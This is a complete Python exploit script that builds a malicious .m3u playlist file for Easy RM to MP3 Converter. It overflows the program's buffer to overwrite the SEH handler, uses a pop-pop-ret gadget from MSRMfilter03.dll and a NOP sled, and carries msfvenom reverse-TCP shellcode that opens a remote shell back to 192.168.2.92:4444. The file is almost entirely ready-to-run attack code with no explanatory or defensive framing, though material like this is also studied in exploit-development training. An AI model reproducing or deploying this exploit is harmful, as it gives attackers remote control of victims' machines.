import sys
import struct
import os

class Exploit:
	@classmethod
	def conv(cls, addr):
		return struct.pack("<I", addr)
	
	@classmethod
	def execute(cls):
		# 0x1002821a : pop ebx # pop ebp # ret  
		# {PAGE_EXECUTE_READ} [MSRMfilter03.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False,
		# v-1.0- (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
		pop_pop_ret = cls.conv(0x1002821a)

		buffer = b"\x41" * 45205
		
		# jump forward 6 bytes
		# 0x909006eb
		next_seh = cls.conv(0x909006eb)
		seh = pop_pop_ret

		nop_sled = b"\x90" * 64

		# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.92 LPORT=4444 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a"
		shellcode=  b""
		shellcode+= b"\xda\xc6\xd9\x74\x24\xf4\x5d\xba\x95\x83\xdc\x90\x31"
		shellcode+= b"\xc9\xb1\x52\x83\xed\xfc\x31\x55\x13\x03\xc0\x90\x3e"
		shellcode+= b"\x65\x16\x7e\x3c\x86\xe6\x7f\x21\x0e\x03\x4e\x61\x74"
		shellcode+= b"\x40\xe1\x51\xfe\x04\x0e\x19\x52\xbc\x85\x6f\x7b\xb3"
		shellcode+= b"\x2e\xc5\x5d\xfa\xaf\x76\x9d\x9d\x33\x85\xf2\x7d\x0d"
		shellcode+= b"\x46\x07\x7c\x4a\xbb\xea\x2c\x03\xb7\x59\xc0\x20\x8d"
		shellcode+= b"\x61\x6b\x7a\x03\xe2\x88\xcb\x22\xc3\x1f\x47\x7d\xc3"
		shellcode+= b"\x9e\x84\xf5\x4a\xb8\xc9\x30\x04\x33\x39\xce\x97\x95"
		shellcode+= b"\x73\x2f\x3b\xd8\xbb\xc2\x45\x1d\x7b\x3d\x30\x57\x7f"
		shellcode+= b"\xc0\x43\xac\xfd\x1e\xc1\x36\xa5\xd5\x71\x92\x57\x39"
		shellcode+= b"\xe7\x51\x5b\xf6\x63\x3d\x78\x09\xa7\x36\x84\x82\x46"
		shellcode+= b"\x98\x0c\xd0\x6c\x3c\x54\x82\x0d\x65\x30\x65\x31\x75"
		shellcode+= b"\x9b\xda\x97\xfe\x36\x0e\xaa\x5d\x5f\xe3\x87\x5d\x9f"
		shellcode+= b"\x6b\x9f\x2e\xad\x34\x0b\xb8\x9d\xbd\x95\x3f\xe1\x97"
		shellcode+= b"\x62\xaf\x1c\x18\x93\xe6\xda\x4c\xc3\x90\xcb\xec\x88"
		shellcode+= b"\x60\xf3\x38\x1e\x30\x5b\x93\xdf\xe0\x1b\x43\x88\xea"
		shellcode+= b"\x93\xbc\xa8\x15\x7e\xd5\x43\xec\xe9\x1a\x3b\xec\xb5"
		shellcode+= b"\xf2\x3e\xf0\x54\x5f\xb6\x16\x3c\x4f\x9e\x81\xa9\xf6"
		shellcode+= b"\xbb\x59\x4b\xf6\x11\x24\x4b\x7c\x96\xd9\x02\x75\xd3"
		shellcode+= b"\xc9\xf3\x75\xae\xb3\x52\x89\x04\xdb\x39\x18\xc3\x1b"
		shellcode+= b"\x37\x01\x5c\x4c\x10\xf7\x95\x18\x8c\xae\x0f\x3e\x4d"
		shellcode+= b"\x36\x77\xfa\x8a\x8b\x76\x03\x5e\xb7\x5c\x13\xa6\x38"
		shellcode+= b"\xd9\x47\x76\x6f\xb7\x31\x30\xd9\x79\xeb\xea\xb6\xd3"
		shellcode+= b"\x7b\x6a\xf5\xe3\xfd\x73\xd0\x95\xe1\xc2\x8d\xe3\x1e"
		shellcode+= b"\xea\x59\xe4\x67\x16\xfa\x0b\xb2\x92\x1a\xee\x16\xef"
		shellcode+= b"\xb2\xb7\xf3\x52\xdf\x47\x2e\x90\xe6\xcb\xda\x69\x1d"
		shellcode+= b"\xd3\xaf\x6c\x59\x53\x5c\x1d\xf2\x36\x62\xb2\xf3\x12"

		payload =  b""
		payload += buffer
		payload += next_seh
		payload += seh
		payload += nop_sled
		payload += shellcode

		print("[+] Creating malicious m3u")

		try:
			out_file = os.getcwd() + "\\owned.m3u"

			with open(out_file, "wb+") as of:
				of.write(payload)

			print("[+] File created successfully")

		except:
			print("[X] Error creating file!")
			sys.exit(0)

if __name__ == "__main__":
	Exploit.execute()